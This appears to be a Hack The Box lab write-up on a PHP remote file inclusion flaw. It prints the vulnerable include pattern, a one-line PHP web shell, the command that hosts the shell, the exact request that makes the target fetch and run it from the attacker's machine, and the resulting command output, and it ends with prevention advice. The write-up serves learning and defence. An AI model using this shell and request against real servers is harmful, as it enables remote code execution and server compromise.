# HTB - Remote File Inclusion (RFI)

## Lab Overview

This lab demonstrates a **Remote File Inclusion (RFI)** vulnerability in PHP.

The application includes files directly from user-controlled input without proper validation.

Because remote URL inclusion is enabled, attackers can host malicious PHP code externally and force the server to execute it.

---

# What is RFI?

Remote File Inclusion occurs when an application dynamically includes files from external sources.

Vulnerable example:

```php
<?php
include($_GET['language']);
?>
```

If PHP settings allow remote inclusion:

```ini
allow_url_include = On
```

an attacker can supply a remote URL instead of a local file.

---

# Why This Is Dangerous

Instead of including trusted local files:

```text
english.php
```

the server fetches attacker-controlled code:

```text
http://attacker-ip/shell.php
```

The remote PHP file is then executed on the victim server.

This directly leads to Remote Code Execution (RCE).

---

# Exploitation Steps

## 1. Host Malicious PHP File

Started a local HTTP server containing:

```php
<?php system($_GET['cmd']); ?>
```

Saved as:

```text
shell.php
```

Example server:

```bash
python3 -m http.server 80
```
<img width="640" height="244" alt="image" src="https://github.com/user-attachments/assets/61558edc-cb59-4cb1-8511-4aea735c761f" />


---

# Why Hosting Works

The vulnerable server fetches remote content from the attacker machine.

Flow:

```text
Victim Server → downloads shell.php → executes PHP code
```

The attacker-controlled PHP becomes part of the application execution flow.

---

# 2. Exploit RFI Vulnerability

Sent request:

```text
http://10.129.29.114/index.php?language=http://10.10.16.244/shell.php&cmd=id
```

---

# Payload Breakdown

## `language=`

Application parameter passed into:

```php
include()
```

---

## `http://10.10.16.244/shell.php`

Remote attacker-controlled PHP payload.

Victim server downloads and executes this file.

---

## `cmd=id`

Passed into:

```php
system($_GET['cmd']);
```

Resulting execution:

```bash
id
```

---

# What Happens Internally?

Application executes:

```php
include("http://10.10.16.244/shell.php");
```

PHP process:

```text
1. Connect to attacker server
2. Download PHP file
3. Parse PHP code
4. Execute commands
```

Result:

```text
uid=33(www-data) gid=33(www-data)
```

confirming Remote Code Execution.
<img width="1154" height="703" alt="image" src="https://github.com/user-attachments/assets/cd4953b4-4ba0-45fb-ac64-aef471dbf626" />

---

# Final Step

Used command execution to locate and read the flag file.

Successfully submitted the flag.

---

# Key Learnings

- RFI is more dangerous than normal LFI
- Remote URLs should never be passed into include functions
- `allow_url_include=On` creates severe risk
- PHP executes remotely included files as trusted code
- Simple command shells can lead to full compromise

---

# Security Impact

RFI vulnerabilities may lead to:

- Remote Code Execution
- Web shell deployment
- Full server compromise
- Credential theft
- Lateral movement

---

# Prevention

- Disable:
  
```ini
allow_url_include = Off
```

- Never include user-controlled input directly
- Use strict allowlists for file inclusion
- Restrict outbound network access from web servers
- Sanitize and validate all include parameters
